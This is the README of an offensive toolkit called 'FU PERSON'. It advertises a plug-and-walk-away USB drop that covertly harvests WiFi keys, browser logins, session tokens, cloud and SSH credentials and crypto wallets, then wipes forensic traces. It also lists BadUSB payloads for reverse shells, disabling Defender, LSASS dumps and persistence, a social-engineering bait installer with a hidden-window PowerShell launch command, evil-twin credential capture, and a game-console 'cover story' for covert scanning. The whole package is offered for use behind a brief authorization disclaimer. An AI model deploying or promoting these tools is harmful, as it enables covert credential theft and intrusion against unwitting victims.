<div align="center">

# FU PERSON v3.1

### **F**ind yo**U** **PERSON**

```
    ███████╗██╗   ██╗    ██████╗ ███████╗██████╗ ███████╗ ██████╗ ███╗   ██╗
    ██╔════╝██║   ██║    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║
    █████╗  ██║   ██║    ██████╔╝█████╗  ██████╔╝███████╗██║   ██║██╔██╗ ██║
    ██╔══╝  ██║   ██║    ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║   ██║██║╚██╗██║
    ██║     ╚██████╔╝    ██║     ███████╗██║  ██║███████║╚██████╔╝██║ ╚████║
    ╚═╝      ╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Find You Person — Integrated Security & OSINT Operations Platform**

[![Version](https://img.shields.io/badge/Version-3.0-00FFFF?style=for-the-badge)]()
[![PowerShell](https://img.shields.io/badge/Engine-PowerShell-FF00FF?style=for-the-badge)]()
[![Dependencies](https://img.shields.io/badge/Dependencies-ZERO-00FF88?style=for-the-badge)]()
[![FLLC](https://img.shields.io/badge/FLLC-2026-7B2FBE?style=for-the-badge)]()
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows)]()
[![Stars](https://img.shields.io/github/stars/Personfu/FU-PERSON?style=for-the-badge&color=FFD700)]()

</div>

---

> **FU** = **F**ind yo**U**. Five devices. One objective. Everything automated where it can be. Everything manual where it must be.

```
┌──────────────────────────────────────────────────────────────────────────┐
│  Property of FLLC  |  Source-Available  |  Authorized Use Only           │
│  OSINT Finder: https://fllc.net/osint  |  Subscriptions Available       │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## `[root@fuperson]─[~/why]`

Standard pentest toolkits need Kali, need Python, need admin access, need time. This doesn't. **One USB stick. One PowerShell script. Sixty seconds.** No installations. No dependencies. No traces. Works on any Windows PC manufactured in the last 15 years.

```
[*] Methodology: Separate automated (USB extraction) from manual (Flipper, field ops)
[*] Language:    PowerShell — already on every Windows target since 2009
[*] Objective:   Plug in. Walk away. Retrieve later.
[+] Status:      OPERATIONAL
```

---

## `[root@fuperson]─[~/arsenal]`

| Device | Role | Automation | Status |
|--------|------|------------|--------|
| **USB Drive** | Data extraction + OSINT + network recon | **Fully automated** — insert and walk away | `[ACTIVE]` |
| **Flipper Zero** | RF/NFC/IR/BadUSB field operations | **Manual** — you operate it | `[ACTIVE]` |
| **ESP32** | WiFi pineapple + scanning | **Standalone** — plugs into tri-drive or runs solo | `[ACTIVE]` |
| **Android (S20+)** | Pentest platform, output to USB drive | **ADB controlled** — headless, no screen | `[ACTIVE]` |
| **Nintendo DSi** | Jailbreak + WiFi recon + CyberWorld cover | **Manual** — blend in, play Pokemon, scan WiFi | `[ACTIVE]` |

```
root@fuperson:~# ./device_sync.ps1 --detect-all
[+] USB Tri-Drive .............. CONNECTED (H:, I:)
[+] Flipper Zero ............... CONNECTED (COM4)
[+] ESP32 DevKit ............... CONNECTED (COM7)
[+] Galaxy S20+ ................ CONNECTED (ADB: authorized)
[+] Nintendo DSi ............... STANDALONE (SD card ready)
[*] All 5 devices operational. Ready for deployment.
```

---

## `[root@fuperson]─[~/automation-matrix]`

```
╔══════════════════════════════════════════════════════════════════════╗
║                    AUTOMATION CAPABILITY MATRIX                      ║
╠══════════════════╦════════════╦═══════════════╦══════════════════════╣
║ Capability       ║ USB Drive  ║ Flipper Zero  ║ ESP32 / S20+ / DSi  ║
╠══════════════════╬════════════╬═══════════════╬══════════════════════╣
║ Data Extraction  ║  AUTO      ║  BADUSB       ║  ---                 ║
║ WiFi Passwords   ║  AUTO      ║  BADUSB       ║  SCAN                ║
║ Network Recon    ║  AUTO      ║  ---          ║  S20+: AUTO          ║
║ OSINT Lookup     ║  INTERACT  ║  ---          ║  ---                 ║
║ RF Operations    ║  ---       ║  MANUAL       ║  ---                 ║
║ NFC/RFID Clone   ║  ---       ║  MANUAL       ║  ---                 ║
║ WiFi Pineapple   ║  ---       ║  GPIO         ║  ESP32: AUTO         ║
║ BLE Scanning     ║  ---       ║  GPIO         ║  ESP32: AUTO         ║
║ Deauth Detection ║  ---       ║  ---          ║  ESP32: AUTO         ║
║ Loot Aggregation ║  AUTO      ║  SYNC         ║  SYNC                ║
║ CyberWorld Cover ║  ---       ║  ---          ║  DSi: ACTIVE         ║
║ Stealth Mode     ║  AUTO      ║  ---          ║  ---                 ║
╚══════════════════╩════════════╩═══════════════╩══════════════════════╝
```

---

## `01` USB DRIVE — The Main Weapon

**Everything is PowerShell. Zero dependencies. Works on any Windows PC since 2009.**

### `[root@fuperson]─[~/usb/extraction-phases]`

Insert the USB drive. One script silently extracts everything and dumps to loot directory.

```
root@fuperson:~# ./harvest.ps1 --silent --auto
[Phase 01/13] ██████████ System info, users, admins, processes, services, AV, USB history
[Phase 02/13] ██████████ IP config, ARP, connections, routes, DNS cache, shares, firewall
[Phase 03/13] ██████████ Every saved WiFi password (SSID + plaintext key)
[Phase 04/13] ██████████ Browser data — 7 browsers (logins, cookies, history, bookmarks, DPAPI)
[Phase 05/13] ██████████ Credential Manager, RDP, PuTTY, SSH keys, AWS/Azure/GCP, Git creds
[Phase 06/13] ██████████ Discord, Telegram, Slack, Teams, Signal, VPN, Thunderbird, FileZilla
[Phase 07/13] ██████████ Password grep, .env files, KeePass DBs, certs, Sticky Notes
[Phase 08/13] ██████████ 11 crypto wallets + seed phrase search
[Phase 09/13] ██████████ Priv esc recon (unquoted paths, writable dirs, DLL hijack)
[Phase 10/13] ██████████ Full screenshot + clipboard text
[Phase 11/13] ██████████ Browser session tokens (Chrome, Edge, Firefox active sessions)
[Phase 12/13] ██████████ Clipboard history + PowerShell transcript logs
[Phase 13/13] ██████████ Trace cleanup (PS history, Run dialog MRU, prefetch, logs)
[+] EXTRACTION COMPLETE — 13/13 phases — loot saved to MicroSD:\loot\HOSTNAME_TIMESTAMP\
[+] Stealth mode: 15-phase anti-forensic cleanup available
[+] Elapsed: 58 seconds
```

### `[root@fuperson]─[~/usb/deployment]`

```bash
# Step 1: Deploy (one time, on YOUR PC)
root@fuperson:~# usb_payload/DEPLOY.bat
[+] SD card (H:) ............... setup.bat + .p/ payload folder deployed
[+] MicroSD (I:) ............... .loot_target marker + loot/ directory created
[+] Flipper BadUSB ............. usb_harvest.txt ready for copy

# Step 2: Trigger (on target)
# Option A: Flipper Zero BadUSB — types launch command in 2 seconds. Zero-click.
# Option B: Social engineering — target sees "USB 3.0 Driver Setup" and runs it
# Option C: Manual — powershell -NoP -W Hidden -Exec Bypass -File "H:\.p\harvest.ps1"

# Step 3: Retrieve MicroSD. All data in loot\ folder.
```

### `[root@fuperson]─[~/usb/interactive-tools]`

```
root@fuperson:~# powershell -Exec Bypass -File "H:\.p\launcher.ps1"

╔══════════════════════════════════════════════════════════════╗
║  [1] SILENT HARVEST      Extract all data (auto, hidden)    ║
║  [2] NETWORK RECON       Ports, hosts, WiFi, shares         ║
║  [3] OSINT TOOLKIT       People, phone, email, domain, IP   ║
║  [4] FULL AUTO           Harvest + recon (background)        ║
║  [5] DEVICE SYNC         Sync loot from all connected devs  ║
║  [6] DEPLOY ALL          Push payloads to all devices        ║
║  [7] STEALTH MODE        Ultra-quiet, clear all traces       ║
║  [0] EXIT                                                    ║
╚══════════════════════════════════════════════════════════════╝
```

### `[root@fuperson]─[~/usb/osint-capabilities]`

| Feature | Details |
|---------|---------|
| **Person lookup** | 12 people search engines + social media enumeration (14 platforms) |
| **Reverse phone** | 9 reverse phone databases |
| **Reverse email** | 8 email lookup services + MX record check |
| **Domain recon** | DNS (A/AAAA/MX/NS/TXT/SOA) + 50 subdomain brute-force + OSINT URLs |
| **IP lookup** | GeoIP + reverse DNS + Shodan/Censys/AbuseIPDB links |
| **Public records** | Court records, SEC filings, FEC donations, patents, corporate filings |
| **Breach data** | HaveIBeenPwned, DeHashed, IntelX, LeakCheck links |
| **Social media** | Username enumeration across 88+ platforms |

### `[root@fuperson]─[~/usb/network-recon]`

| Feature | Details |
|---------|---------|
| **Port scanner** | Async, 100+ threads, top 100 ports, service fingerprinting |
| **Host discovery** | ARP + ICMP sweep, auto-detect subnet, MAC + hostname resolution |
| **WiFi analysis** | All saved passwords + nearby networks + current connection details |
| **Share enum** | SMB shares, common admin shares (C$, ADMIN$), mapped drives |
| **Bluetooth** | BT device discovery, paired device history, service enumeration |
| **USB history** | Previously connected USB devices, serial numbers, timestamps |
| **Full auto recon** | Runs everything above, saves to loot directory |

---

## `02` FLIPPER ZERO — Standalone Field Tool

The Flipper is your hands-on operations device. **You control it. It does not auto-launch.**

### `[root@fuperson]─[~/flipper/badusb-arsenal]`

```
root@fuperson:~# ls flipper/badusb/ | wc -l
35+ payloads ready to deploy
```

| Payload | What It Does | Stealth |
|---------|-------------|---------|
| `phantom_usb.txt` | Zero-touch auto-deploy master chain | `███████` |
| `rapid_exfil.txt` | Fast system info exfiltration | `██████░` |
| `credential_dump.txt` | Windows Credential Manager dump | `█████░░` |
| `browser_harvest.txt` | Browser data extraction (all 7) | `██████░` |
| `sam_dump.txt` | SAM/SYSTEM registry hive copy | `████░░░` |
| `reverse_shell.txt` | PowerShell reverse shell | `█████░░` |
| `net_diag.txt` | Base64 encoded reverse shell (AV bypass) | `███████` |
| `disable_defender.txt` | Disable Windows Defender | `███░░░░` |
| `rdp_enable.txt` | Enable Remote Desktop | `████░░░` |
| `persistence_install.txt` | Install persistent backdoor | `██████░` |
| `ad_enum.txt` | Active Directory enumeration | `█████░░` |
| `cloud_creds.txt` | Cloud credential harvesting | `██████░` |
| `crypto_wallet.txt` | Crypto wallet extraction | `██████░` |
| `uac_bypass.txt` | 3-method UAC bypass | `████░░░` |
| `lsass_dump.txt` | LSASS memory dump | `███░░░░` |
| `cyberworld_deploy.txt` | Deploy CyberWorld to DSi SD card | `███████` |
| ...and 20+ more | See `flipper/badusb/` | |

### `[root@fuperson]─[~/flipper/modules]`

| Module | Location | Content |
|--------|----------|---------|
| **Sub-GHz** | `flipper/subghz/` | Frequency DB, garage codes, IoT devices, protocol reference, vehicle keyfobs |
| **NFC** | `flipper/nfc/` | 150+ MIFARE keys, NDEF payloads, card formats, EMV reference, attack playbook |
| **Infrared** | `flipper/infrared/` | 290+ signals: TV, AC, soundbar, projector, fan, LED, STB universals |
| **RFID** | `flipper/rfid/` | 19 protocol format database with attack playbooks |
| **iButton** | `flipper/ibutton/` | 25+ model type database with cloning guide |
| **GPIO** | `flipper/gpio/` | ESP32 Marauder commands, BLE attacks, advanced recon, auto-recon sequences |

Full tactical guide: `flipper/FLIPPER_PLAYBOOK.md`

---

## `03` ESP32 — WiFi Pineapple + Scanner

DIYMalls ESP32 DevKit V1.1 running custom firmware. WiFi pineapple mode + wardriving + BLE recon.

```
root@fuperson:~# ./flash_esp32.py --port COM7 --firmware FLLC_wardriver
[*] Flashing FLLC Wardriver firmware...
[+] WiFi scanning .............. ENABLED
[+] Deauth detection ........... ENABLED
[+] Probe capture .............. ENABLED
[+] BLE scanning ............... ENABLED
[+] Evil Twin (Pineapple) ...... ENABLED
[+] Captive Portal ............. ENABLED
[+] Beacon Spam ................ ENABLED
[+] PMKID Capture .............. ENABLED
[+] SD card logging ............ ENABLED (PCAP/JSON)
[+] Firmware flashed successfully. Device ready.
```

| Mode | Description |
|------|-------------|
| **Wardriver** | Passive WiFi/BLE scanning with GPS-less timestamped logging |
| **Pineapple** | Evil Twin AP + captive portal for credential harvesting |
| **Deauth Monitor** | Detect active deauth attacks on surrounding networks |
| **Probe Hunter** | Log probe requests revealing hidden SSIDs devices search for |
| **Beacon Flood** | Spam area with fake SSIDs for confusion/cover |
| **PMKID Grabber** | WPA handshake-free password attack material capture |

**Firmware:** `firmware/esp32/FLLC_wardriver/` | **Config:** `config.h` + `pineapple.h`

---

## `04` ANDROID — Galaxy S20+ Headless Platform

**The screen is broken. Everything is ADB over USB. It becomes a weapon.**

```bash
root@fuperson:~# adb devices
List of devices attached
R5CR1234567     device

root@fuperson:~# ./setup_termux.sh
[+] Installing Termux packages .......... nmap, sqlmap, aircrack-ng, hashcat, tor
[+] Installing Kali tools ............... nethunter, bettercap, wifite, responder
[+] Configuring Magisk root ............. SU access granted
[+] Setting up USB output ............... loot dumps to /sdcard/loot/
[+] Headless recon scripts .............. deployed
[*] Galaxy S20+ pentest platform ready.
```

| Feature | Script | Output |
|---------|--------|--------|
| Termux full setup | `setup_termux.sh` | Installs 40+ pentest tools |
| Magisk root | `magisk_setup.sh` | Full root access |
| WiFi attacks | `wifi_attacks.sh` | Deauth, evil twin, handshake capture |
| Headless recon | `headless_recon.sh` | Full network scan, output to USB |
| USB loot dump | `usb_output.sh` | Auto-detect USB, dump all loot |
| ADB remote control | `adb_control.py` | Full device automation from PC |
| Screen mirror | `scrcpy_setup.bat` | Mirror screen to PC via USB |

---

## `05` NINTENDO DSi — CyberWorld Cover

**Blend in. Play Pokemon. Scan WiFi. Take notes. Nobody suspects a DSi.**

### `[root@fuperson]─[~/dsi/cyberworld]`

```
╔══════════════════════════════════════════════════════════════╗
║              ░█▀▀░█░█░█▀▄░█▀▀░█▀▄░█░█░█▀█░█▀▄░█░░░█▀▄     ║
║              ░█░░░░█░░█▀▄░█▀▀░██▀░█▄█░█░█░██▀░█░░░█░█     ║
║              ░▀▀▀░░▀░░▀▀░░▀▀▀░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀▀░     ║
║                                                              ║
║  Pokemon-style RPG where you catch EXPLOITS, not creatures.  ║
║  Battle system based on real attack categories.              ║
║  WiFi recon runs silently in the background.                 ║
║  Perfect cover story — you're just playing a game.           ║
╚══════════════════════════════════════════════════════════════╝
```

**CyberWorld** is a Pokemon-themed hacking game concept for the DSi. While you appear to be playing a Game Boy-style RPG, the DSi silently runs WiFi reconnaissance via homebrew tools in the background.

| Element | CyberWorld Equivalent |
|---------|----------------------|
| Pokemon | **Daemons** — digital entities based on real exploits/tools |
| Types | Network, Web, Binary, Social, Crypto, Wireless, Physical, Zero-Day |
| Gym Leaders | Sysadmins defending their network segments |
| Elite Four | SOC Analysts |
| Champion | The CISO |
| Regions | LAN Valley, WAN Wasteland, Darknet Depths, Cloud Citadel |
| Items | Wireshark Lens, Burp Proxy Shield, Hashcat Hammer, Nmap Scanner |
| Starter Daemons | `Ping` (Network), `XSSling` (Web), `Stacksmash` (Binary) |

Full game design: `mobile/dsi/cyberworld/CYBERWORLD.md`
Daemon bestiary (50+ creatures): `mobile/dsi/cyberworld/DAEMONS.md`
ROM patch guide: `mobile/dsi/cyberworld/rom_patches.md`

### `[root@fuperson]─[~/dsi/capabilities]`

| Capability | Details |
|------------|---------|
| 200+ classic games | Pokemon collection (35+), NDS, GBA, GB, NES, SNES |
| CyberWorld cover | Play "Pokemon" while scanning WiFi |
| WiFi recon | Covert SSID/BSSID scanning via homebrew |
| Data transfer | DSi FTP to dump scan data |
| Blend-in factor | **Maximum** — nobody suspects a kid's handheld |

Full setup: `mobile/dsi/DSI_FULL_SETUP.md` | Toolkit: `mobile/dsi/dsi_toolkit.py`

---

## `[root@fuperson]─[~/fllc-osint-finder]`

```
╔══════════════════════════════════════════════════════════════╗
║  FU PERSON OSINT FINDER — https://fllc.net/osint            ║
║  Find You Person. Find Anyone. Know Everything. Legally.     ║
║                                                              ║
║  All data sourced from publicly available databases.         ║
║  Subscription required for full access.                      ║
╚══════════════════════════════════════════════════════════════╝
```

| Feature | Free Tier | Pro ($9.99/mo) | Elite ($29.99/mo) |
|---------|-----------|----------------|-------------------|
| People Search | 3/day | Unlimited | Unlimited + deep |
| Phone Lookup | 1/day | Unlimited | Unlimited + carrier |
| Email Trace | 1/day | Unlimited | Unlimited + breach |
| Domain Intel | --- | Unlimited | Unlimited + history |
| IP Geolocation | --- | Unlimited | Unlimited + ISP |
| Social Media Sweep | --- | --- | 88+ platforms |
| Billing & Account | --- | Email + Card | Full management |
| Export (PDF/JSON/CSV) | --- | PDF only | All formats |

**Web frontend:** `web/index.html` | **OSINT dashboard:** `web/app.html`

---

## `[root@fuperson]─[~/extended-modules]`

Advanced PowerShell scripts for deeper engagements. Require more time and elevated privileges.

```
root@fuperson:~# ls payloads/windows/
[*] Loading attack modules...
```

| Script | Purpose | Technique |
|--------|---------|-----------|
| `auto_pwn.ps1` | 15-phase master orchestrator | Uses all modules below |
| `evasion.ps1` | AMSI/ETW/Defender bypass framework | Patch + unhook + blind |
| `ai_evasion.ps1` | AI/ML EDR evasion | Behavioral randomization |
| `privesc.ps1` | Windows privilege escalation scanner | 20+ vectors |
| `persistence_engine.ps1` | 12-method persistence | WMI, COM, DLL sideload, Accessibility, AppInit, File handler, Logon script |
| `cloud_harvester.ps1` | M365/Google/Azure/AWS tokens | Token + session theft |
| `comms_harvester.ps1` | Teams/Slack/Discord/Signal | Message + file extraction |
| `crypto_hunter.ps1` | Wallet + seed phrase hunting | 11 wallets + regex |
| `compliance_scanner.ps1` | NIST/CIS/PCI/SOC2 audit | Gap analysis + report |
| `sqli_scanner.ps1` | SQL injection automation | Local web services |
| `npp_exploit.ps1` | Notepad++ DLL hijack | Config injection |
| `input_monitor.py` | Keystroke/screenshot logger | Requires Python |
| `linux_collector.sh` | Linux data collection (12-phase) | Cloud/container aware |

---

## `[root@fuperson]─[~/laptop-tools]`

Python tools for YOUR machine. Require Python installed.

```bash
root@fuperson:~# pip install -r requirements.txt
root@fuperson:~# python core/people_finder.py --target "John Doe"
[*] Searching 88+ platforms...
[+] Found 47 matches across 12 platforms
[+] Report saved: people_finder_reports/john_doe_20260216.json
```

| Tool | What It Does |
|------|-------------|
| `core/pentest_suite.py` | Automated penetration testing |
| `core/osint_recon_suite.py` | OSINT reconnaissance engine |
| `core/galaxy_recon_suite.py` | Deep intelligence platform |
| `core/people_finder.py` | 88+ platform people search |
| `core/repo_collector.py` | GitHub repository aggregation |
| `core/list_consolidator.py` | Wordlist consolidation engine |
| `core/data/` | Pre-consolidated master wordlists |

---

## `[root@fuperson]─[~/repo-structure]`

```
FU-PERSON/
│
├── usb_payload/                    ██ READY-TO-DEPLOY USB FILES
│   ├── DEPLOY.bat                  One-click deployment to SD + MicroSD
│   ├── sd_card/                    → Copy to SD card (H:)
│   │   ├── setup.bat              Social engineering trigger
│   │   ├── README.txt             Bait file
│   │   └── .p/                    Hidden payload folder
│   │       ├── harvest.ps1        Silent 13-phase data extraction
│   │       ├── osint.ps1          People/phone/email/domain/IP lookup
│   │       ├── recon.ps1          Port scan, host discovery, WiFi, shares
│   │       ├── launcher.ps1       Master menu for all tools
│   │       ├── device_sync.ps1    Multi-device loot synchronization
│   │       ├── stealth_mode.ps1   15-phase anti-forensic cleanup
│   │       └── report_generator.ps1  AES-256 encrypted loot report builder
│   ├── microsd/                   → Copy to MicroSD (I:)
│   │   └── .loot_target           Drive identification marker
│   └── flipper_badusb/            → Copy to Flipper Zero
│       └── usb_harvest.txt        Zero-click auto-launch
│
├── flipper/                        ██ FLIPPER ZERO ARSENAL
│   ├── badusb/                    35+ BadUSB payloads
│   ├── subghz/                    Sub-GHz frequency data
│   ├── nfc/                       NFC attack resources
│   ├── infrared/                  Universal IR remotes (290+ signals)
│   ├── rfid/                      RFID format database
│   ├── ibutton/                   iButton types
│   ├── gpio/                      ESP32 GPIO integration
│   └── FLIPPER_PLAYBOOK.md        Full tactical guide
│
├── firmware/esp32/                 ██ ESP32 WARDRIVER + PINEAPPLE
│   ├── FLLC_wardriver/            Arduino project
│   │   ├── FLLC_wardriver.ino     Main firmware
│   │   ├── config.h               Hardware config
│   │   ├── pineapple.h            Evil Twin + captive portal config
│   │   └── oui.h                  OUI database
│   ├── platformio.ini             Build config
│   └── flash_esp32.py             Flash utility
│
├── mobile/
│   ├── s20_headless/               ██ GALAXY S20+ HEADLESS PENTEST
│   │   ├── setup_termux.sh        Termux bootstrap
│   │   ├── magisk_setup.sh        Magisk root setup
│   │   ├── wifi_attacks.sh        WiFi attack scripts
│   │   ├── headless_recon.sh      Headless reconnaissance
│   │   ├── usb_output.sh          Auto USB loot dump
│   │   ├── adb_control.py         ADB remote control
│   │   └── scrcpy_setup.bat       Screen mirror setup
│   └── dsi/                        ██ NINTENDO DSi + CYBERWORLD
│       ├── DSI_FULL_SETUP.md      Complete jailbreak guide
│       ├── dsi_toolkit.py         DSi SD card builder
│       └── cyberworld/            Pokemon-hacker game concept
│           ├── CYBERWORLD.md      Game design document
│           ├── DAEMONS.md         Daemon bestiary (50+ creatures)
│           ├── rom_patches.md     ROM hack guide
│           ├── autolaunch.ini     TWiLight Menu++ config
│           └── covert_scan.py     Background WiFi scanner
│
├── payloads/                       ██ EXTENDED ATTACK MODULES
│   ├── windows/                   15 PowerShell attack scripts
│   └── linux/                     Linux collector
│
├── core/                           ██ PYTHON TOOLS (your laptop)
│   ├── people_finder.py           88+ platform OSINT
│   ├── pentest_suite.py           Pentest automation
│   ├── osint_recon_suite.py       OSINT engine
│   ├── galaxy_recon_suite.py      Deep intelligence
│   ├── repo_collector.py          GitHub aggregator
│   ├── list_consolidator.py       Wordlist engine
│   └── data/                      Master wordlists
│
├── web/                            ██ FLLC.NET OSINT FINDER
│   ├── index.html                 Landing page + subscription
│   ├── app.html                   OSINT dashboard
│   ├── privacy.html               Privacy policy
│   ├── terms.html                 Terms of service
│   ├── css/                       Styles + animations
│   └── js/                        App logic + matrix effect
│
├── docs/                           ██ DOCUMENTATION
├── deploy/                         ██ DEPLOYMENT SCRIPTS
├── recorder/                       ██ VOICE-ACTIVATED RECORDER
│
├── LICENSE                         Source-Available License
├── SECURITY.md                     Vulnerability disclosure
└── CONTRIBUTING.md                 Contribution policy
```

---

## `[root@fuperson]─[~/quick-start]`

### USB Drop (automated extraction)

```bash
root@fuperson:~# usb_payload/DEPLOY.bat          # Deploy to SD + MicroSD
root@fuperson:~# # Insert USB into target         # Or use Flipper BadUSB
root@fuperson:~# # Retrieve MicroSD later          # Data in loot/ folder
```

### Interactive OSINT/Recon (from USB)

```bash
root@fuperson:~# powershell -Exec Bypass -File "H:\.p\launcher.ps1"
```

### Flipper Zero

```bash
root@fuperson:~# # Copy flipper/ contents to Flipper SD card. Operate manually.
```

### Galaxy S20+ (headless)

```bash
root@fuperson:~# adb shell am start -n com.termux/.HomeActivity
root@fuperson:~# adb shell input text 'bash /sdcard/headless_recon.sh'
```

### CyberWorld (DSi cover)

```bash
root@fuperson:~# python mobile/dsi/dsi_toolkit.py --build-cyberworld
[+] CyberWorld files deployed to DSi SD card
[+] WiFi scanner configured for background operation
[+] Cover story: active. You're just playing Pokemon.
```

### FLLC.net OSINT Finder

```bash
root@fuperson:~# # Open web/index.html in browser for local preview
root@fuperson:~# # Production: https://fllc.net/osint
```

---

## `[root@fuperson]─[~/legal]`

```
┌──────────────────────────────────────────────────────────────────────────┐
│  FU PERSON (Find You Person) Source-Available License v1.0               │
│  Copyright 2025-2026 FLLC. All rights reserved.                         │
│                                                                          │
│  Authorized security testing only. Unauthorized computer access is a     │
│  federal crime (18 U.S.C. 1030). You are solely responsible for legal    │
│  compliance. Do not use against any system without explicit written       │
│  authorization.                                                          │
│                                                                          │
│  Contact: preston@fllc.net                                               │
└──────────────────────────────────────────────────────────────────────────┘
```

---

<div align="center">

```
╔═══════════════════════════════════════╗
║          FLLC  |  2026               ║
║   Find You Person. Always.            ║
╚═══════════════════════════════════════╝
```

</div>
